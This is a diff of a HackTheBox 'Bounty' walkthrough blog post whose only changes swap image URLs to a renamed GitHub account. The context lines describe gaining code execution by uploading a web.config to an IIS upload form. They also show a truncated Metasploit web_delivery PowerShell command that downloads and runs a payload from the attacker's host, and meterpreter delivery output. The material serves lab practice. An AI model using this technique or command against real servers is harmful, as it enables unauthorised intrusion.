@@ -4,7 +4,7 @@ title: Hackthebox Bounty Walkthrough
 categories: HackTheBox
 ---
 
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2019-09-19/bounty-badge.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-09-19/bounty-badge.png)
 ## Explanation
 <a href="https://www.hackthebox.eu">Hackthebox</a> is a website which has a bunch of vulnerable machines in its own VPN.<br>
 This is a walkthrough of a machine "Bounty" on that website.<br>
@@ -60,12 +60,12 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 ### 2. Getting User
 
 We have only one port opening 80 (HTTP).
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2019-09-19/2019-09-18-12-05-36.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-09-19/2019-09-18-12-05-36.png)
 
 We have only 2 path available. "transfer.aspx" and "Uploadedfiles".<br>
 If we upload .jpg file with "transfer.aspx", it will be uploaded into "Uploadedfiles".<br>
 However, if we upload .aspx file, we get this message below.
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2019-09-19/2019-09-19-10-52-43.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-09-19/2019-09-19-10-52-43.png)
 
 By trying some extensions, we can find that it's possible to upload .config file.<br>
 Besides, we can find a <a href="https://soroush.secproject.com/blog/2014/07/upload-a-web-config-file-for-fun-profit/">blog post</a> which mentions RCE by uploading web.config.<br>
@@ -134,7 +134,7 @@ Response.Write(thisDir)%>
 {% endhighlight %}
 
 Upload the "web.config". We get following message.
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2019-09-19/2019-09-18-16-31-36.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-09-19/2019-09-18-16-31-36.png)
 
 Then, run the metasploit module "web_delivery".<br>
 It launches a meterpreter shell handler and generates a command to be ran on the target server.
@@ -165,7 +165,7 @@ powershell.exe -nop -w hidden -c $c=new-object net.webclient;$c.proxy=[Net.WebRe
 
 After that, open the "web.config" which we uploaded and there should be a form which we can run any Windows command.<br>
 By running provided command from "web_delivery", we can achieve a meterpreter shell.
-![placeholder](https://media.githubusercontent.com/media/inar1/inar1.github.io/master/public/images/2019-09-19/2019-09-18-21-13-01.png)
+![placeholder](https://media.githubusercontent.com/media/1n4r1/1n4r1.github.io/master/public/images/2019-09-19/2019-09-18-21-13-01.png)
 {% highlight shell %}
 msf5 exploit(multi/script/web_delivery) > [*] 10.10.10.93      web_delivery - Delivering Payload (2121) bytes
 [*] Sending stage (206403 bytes) to 10.10.10.93
